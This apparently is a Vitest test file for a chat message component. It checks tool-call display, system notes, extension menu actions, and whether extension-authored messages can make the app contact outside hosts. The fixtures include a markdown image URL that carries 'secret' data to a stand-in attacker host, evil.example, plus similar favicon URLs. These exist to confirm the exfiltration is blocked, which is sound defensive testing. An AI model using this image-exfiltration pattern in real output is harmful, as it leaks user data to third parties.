import { describe, it, expect, vi } from 'vitest'
import { render, screen } from '@testing-library/react'
import { MessageItem } from './MessageItem'
import type { UIMessage } from 'ai'
import {
  ContributionStore,
  useContributions,
} from '@/lib/extensions/contributions'
import { manifest } from '@/lib/extensions/__tests__/fixtures'
import { toolWireName } from '@/lib/extensions/tools'

vi.mock('@/i18n/react-i18next-compat', () => ({
  useTranslation: () => ({ t: (k: string) => k }),
}))
vi.mock('@tanstack/react-router', () => ({
  useParams: () => ({}),
}))

describe('what a turn shows besides its messages', () => {
  const pendingWrite: UIMessage = {
    id: 'm1',
    role: 'assistant',
    parts: [
      {
        type: 'tool-write',
        toolCallId: 'c1',
        state: 'input-available',
        input: { path: '/proj/report.html' },
      } as never,
    ],
  } as UIMessage

  /// Every kind of progress now reports itself where it happens: a tool call on
  /// its own card, a subagent on the chip beside the composer. What is left
  /// here is the model-load and prompt-reading progress, which has nowhere
  /// else to go.
  it('leaves a pending tool call to its own card', () => {
    render(
      <MessageItem
        message={pendingWrite}
        isFirstMessage={false}
        isLastMessage={true}
        status="streaming"
      />
    )
    expect(screen.queryByRole('status')).not.toBeInTheDocument()
  })

  it('renders a system note on its own, with no message chrome', () => {
    render(
      <MessageItem
        message={
          {
            id: 'sys-1',
            role: 'system',
            parts: [
              {
                type: 'text',
                text: "Subagent 'researcher' (c1) finished. Its full answer is in /tmp/subagents/r.md",
              },
            ],
          } as UIMessage
        }
        isFirstMessage={false}
        isLastMessage={true}
        status="ready"
      />
    )
    expect(screen.getByText(/finished/)).toBeInTheDocument()
    // No copy/remember/regenerate: nobody said it, so there is nothing to act on.
    expect(screen.queryByRole('button')).not.toBeInTheDocument()
  })
})

describe('extension message actions', () => {
  const reply = {
    id: 'm2',
    role: 'assistant',
    parts: [{ type: 'text', text: 'hi' }],
  } as UIMessage

  it('offers contributed actions only when the thread is known', () => {
    const registration = new ContributionStore(
      useContributions
    ).registerExtension(
      manifest('acme.msg', {
        contributes: {
          commands: [{ id: 'explain', title: 'Explain' }],
          menus: { 'message/actions': [{ command: 'explain' }] },
        },
      })
    )
    try {
      const { rerender } = render(
        <MessageItem
          message={reply}
          isFirstMessage={false}
          isLastMessage={false}
          status="ready"
        />
      )
      expect(screen.queryByLabelText('extensions:moreActions')).toBeNull()
      rerender(
        <MessageItem
          message={reply}
          isFirstMessage={false}
          isLastMessage={false}
          status="ready"
          threadId="t1"
        />
      )
      expect(screen.getByLabelText('extensions:moreActions')).toBeInTheDocument()
    } finally {
      registration.dispose()
    }
  })
})

// janhq/jan-internal#517: a message an extension wrote (or its provider
// streamed) must not make the app contact any host.
describe('extension-authored messages', () => {
  const message = (metadata?: Record<string, unknown>) =>
    ({
      id: 'm3',
      role: 'assistant',
      metadata,
      parts: [
        { type: 'text', text: 'see ![p](https://evil.example/p?d=secret)' },
        {
          type: 'file',
          mediaType: 'image/png',
          url: 'https://evil.example/f.png',
        },
        {
          type: 'file',
          mediaType: 'image/png',
          url: 'data:image/png;base64,iVBORw0KGgo=',
        },
      ],
    }) as UIMessage

  const srcs = (container: HTMLElement) =>
    Array.from(container.querySelectorAll('img')).map((i) =>
      i.getAttribute('src')
    )

  it('loads only inline images', () => {
    const { container } = render(
      <MessageItem
        message={message({ extensionAuthor: 'acme.writer' })}
        isFirstMessage={false}
        isLastMessage={false}
        status="ready"
      />
    )
    expect(srcs(container)).toEqual(['data:image/png;base64,iVBORw0KGgo='])
  })

  it('leaves other assistant messages as they were', () => {
    const { container } = render(
      <MessageItem
        message={message()}
        isFirstMessage={false}
        isLastMessage={false}
        status="ready"
      />
    )
    expect(srcs(container)).toEqual(
      expect.arrayContaining([
        'https://evil.example/p?d=secret',
        'https://evil.example/f.png',
      ])
    )
  })
})

describe('citations from extension tools', () => {
  const wire = toolWireName('acme.search', 'search')
  const output = JSON.stringify({
    results: [{ url: 'https://a.example/', favicon: 'https://evil.example/t' }],
  })

  it('never fetches a favicon, even in a built-in model reply', () => {
    const { container } = render(
      <MessageItem
        message={
          {
            id: 'm4',
            role: 'assistant',
            parts: [
              {
                type: `tool-${wire}`,
                toolCallId: 'c1',
                state: 'output-available',
                input: {},
                output,
              } as never,
              { type: 'text', text: 'done' },
            ],
          } as UIMessage
        }
        isFirstMessage={false}
        isLastMessage={false}
        status="ready"
      />
    )
    expect(container.querySelector('img')).toBeNull()
  })
})
